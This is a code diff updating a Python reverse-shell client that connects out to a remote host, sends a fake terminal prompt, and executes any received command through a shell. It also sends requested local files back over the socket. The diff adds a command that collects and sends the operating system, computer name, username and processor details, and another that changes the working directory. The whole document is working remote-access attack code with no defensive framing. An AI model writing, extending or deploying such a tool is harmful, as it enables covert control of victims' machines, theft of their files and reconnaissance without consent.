@@ -15,26 +15,44 @@ s.connect((SHOST, SPORT))
 while True: 
     try: 
         input_h = f"""{colorama.Fore.RED}{getpass.getuser()}@{platform.node()}{colorama.Style.RESET_ALL}:{colorama.Fore.LIGHTBLUE_EX}{os.getcwd()}{colorama.Style.RESET_ALL}$ """
-        s.send(input_h.encode())
-        stdout, stderr = None, None
+        s.sendall(input_h.encode())
+        vStdout, vStderr = None, None
         cmd = s.recv(1024).decode("utf-8")  # adjust the byte limit
 
         ### cmds
-
+        if cmd == "smth":
+            pass
         # Download files
-        if cmd.split(" ")[0] == "download":
+        elif cmd.split(" ")[0] == "download":
             with open(cmd.split(" ")[1], "rb") as fs:
                 data = fs.read(1024)    # adjust
                 while data:
                     print("Transfering", data) # comment, cause terminal will be packed
-                    s.send(data)
+                    s.sendall(data)
                     data = fs.read(1024)    # adjust
                 sleep(1)
-                s.send(b'all good')
+                s.sendall(b"check")
             print("Data was sent.")
 
-        elif cmd == "bye bro":
-            s.send(b'shutting connection down')
+        # Get system info
+        elif cmd == "sysinfo":
+            sysinfo = f"""
+Operating System: {platform.system()}
+Computer Name: {platform.node()}
+Username: {getpass.getuser()}
+Release Version: {platform.release()}
+Processor Architecture: {platform.processor()}
+            """
+            s.sendall(sysinfo.encode())
+
+     # Change directory
+        elif cmd.split(" ")[0] == "cd":
+            os.chdir(cmd.split(" ")[1])
+            s.sendall("Changed directory to {}".format(os.getcwd()).encode())
+        
+
+        elif cmd == "bye":
+            s.sendall(b'shutting connection down')
             break
 
 
@@ -43,9 +61,9 @@ while True:
             exe = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             vStdout, vStderr = exe.communicate()
             if not vStdout:
-                s.send(vStderr)
+                s.sendall(vStderr)
             else:
-                s.send(vStdout)
+                s.sendall(vStdout)
         
         # if smth brakes 
 
@@ -54,6 +72,6 @@ while True:
             break
     except Exception as oopsie:
     #    s.send(f"Umm, error: {oppsie}")    # this doesnt work. needs to be encoded: 
-        s.send("Umm, error: {}".format(str(oopsie)).endcode())
+        s.sendall("Umm, error: {}".format(str(oopsie)).encode())
 
 s.close()
